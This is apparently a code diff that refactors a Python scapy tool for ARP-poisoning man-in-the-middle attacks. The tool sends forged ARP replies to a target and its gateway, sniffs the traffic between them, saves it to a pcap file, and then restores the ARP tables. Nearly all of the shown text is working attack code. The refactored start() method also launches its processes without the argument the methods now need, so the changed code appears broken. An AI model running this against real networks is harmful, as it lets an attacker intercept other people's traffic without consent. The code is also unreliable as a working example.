@@ -38,7 +38,7 @@ def enable_forwarding():
 
 
 class Arper:
-    def __init__(self, target: str, gateway: str, interface:str, count: int = 200, delay=2, autorestore: bool = True):
+    def __init__(self, target: str, gateway: str, interface:str, count: int = 200, delay=2, autorestore: bool = True, active=True):
         '''
         :param target: Target IPv4 address
         :param gateway: Gateway IPv4 address
@@ -62,8 +62,10 @@ class Arper:
         self.count = count
         self.interface = interface
         self.delay = delay
+        self.active = active
         self.poison_event = Event()
         self.sniff_event = Event()
+        self.sniff_process: Process
         conf.iface = interface
         conf.verb = 0
 
@@ -73,17 +75,15 @@ class Arper:
         print('-' * 30)
 
     def run(self):
-        self.sniff_process = Process(target=self.sniff)
-        self.sniff_process.start()
-        sleep(1)
-        poison_process = Process(target=self.poison)
-        poison_process.start()
-        self.sniff_process.join()
-        poison_process.join()
+        attacker = ActiveAttacker() if self.active else PassiveAttacker()
+        attacker.start(self)
 
-    def poison(self):
-        ether1 = Ether(dst=self.target_mac)
-        arp1 = ARP(op=2, psrc=self.gateway, pdst=self.target, hwdst=self.target_mac)
+            
+class ActiveAttacker:
+    
+    def poison(self, arper: Arper):
+        ether1 = Ether(dst=arper.target_mac)
+        arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
         poison_target = ether1 / arp1
 
         print(f'IP src: {poison_target[ARP].psrc}')
@@ -93,8 +93,8 @@ class Arper:
         print(poison_target.summary())
         print('-' * 30)
 
-        ether2 = Ether(dst=self.gateway_mac)
-        arp2 = ARP(op=2, psrc=self.target, pdst=self.gateway, hwdst=self.gateway_mac)
+        ether2 = Ether(dst=arper.gateway_mac)
+        arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
         poison_gateway = ether2 / arp2
         
         print(f'IP src: {poison_gateway[ARP].psrc}')
@@ -105,59 +105,80 @@ class Arper:
         print('-' * 30)
         print('Beginning the ARP poison. [CTRL-C to stop]')
 
-        while not self.poison_event.wait(0):
+        while not arper.poison_event.wait(0):
             sys.stdout.write('.')
             sys.stdout.flush()
             try:
                 sendp(poison_target)
                 sendp(poison_gateway)
             except KeyboardInterrupt:
-                self.sniff_process.kill()
-                self.restore()
+                arper.sniff_process.kill()
+                self.restore(arper)
                 print('Aborted')
                 return
             else:
-                sleep(self.delay)
-        self.restore()
+                sleep(arper.delay)
+        self.restore(arper)
 
-    def sniff(self):
-        print(f'Sniffing {self.count} packets')
-        bpf_filter = f'host {self.target} and host {self.gateway} and not arp'
-        packets = sniff(count=self.count, filter=bpf_filter, iface=self.interface)
-        self.poison_event.set()
-        wrpcap(f"arper_{self.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
+    def sniff_and_store(self, arper: Arper):
+        print(f'Sniffing {arper.count} packets')
+        bpf_filter = f'host {arper.target} and host {arper.gateway} and not arp'
+        packets = sniff(count=arper.count, filter=bpf_filter, iface=arper.interface)
+        arper.poison_event.set()
+        wrpcap(f"arper_{arper.target}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pcap", packets)
         print('Got the packets')
 
-    def restore(self):
+    def restore(self, arper: Arper):
         '''
         Automatically restore the ARP table after the attack ends 
         or the attack is cancelled
         '''
-        if self.autorestore:
+        if arper.autorestore:
             print('Restoring ARP tables...')
             sendp(
-                Ether(src=self.gateway_mac, 
-                      dst=self.target_mac) / 
+                Ether(src=arper.gateway_mac, 
+                      dst=arper.target_mac) / 
                 ARP(
                     op=2, 
-                    psrc=self.gateway, 
-                    hwsrc=self.gateway_mac, 
-                    pdst=self.target, 
-                    hwdst=self.target_mac, 
+                    psrc=arper.gateway, 
+                    hwsrc=arper.gateway_mac, 
+                    pdst=arper.target, 
+                    hwdst=arper.target_mac, 
                     ), 
                 count=5
                 )
             sendp(
-                Ether(src=self.target_mac, 
-                      dst=self.gateway_mac) / 
+                Ether(src=arper.target_mac, 
+                      dst=arper.gateway_mac) / 
                 ARP(
                     op=2, 
-                    psrc=self.target, 
-                    hwsrc=self.target_mac, 
-                    pdst=self.gateway, 
-                    hwdst=self.gateway_mac
+                    psrc=arper.target, 
+                    hwsrc=arper.target_mac, 
+                    pdst=arper.gateway, 
+                    hwdst=arper.gateway_mac
                     ), 
                 count=5)
+    
+    def start(self, arper:Arper):
+        arper.sniff_process = Process(target=self.sniff_and_store)
+        arper.sniff_process.start()
+        sleep(1)
+        poison_process = Process(target=self.poison)
+        poison_process.start()
+        arper.sniff_process.join()
+        poison_process.join()
+
+class PassiveAttacker:
+
+    def poison(self, arper: Arper):
+        pass
+
+    def sniff_and_store(self, arper: Arper):
+        pass
+
+    def start(self, arper: Arper):
+        pass
+
 
 if __name__ == '__main__':
     '''main execution flow'''
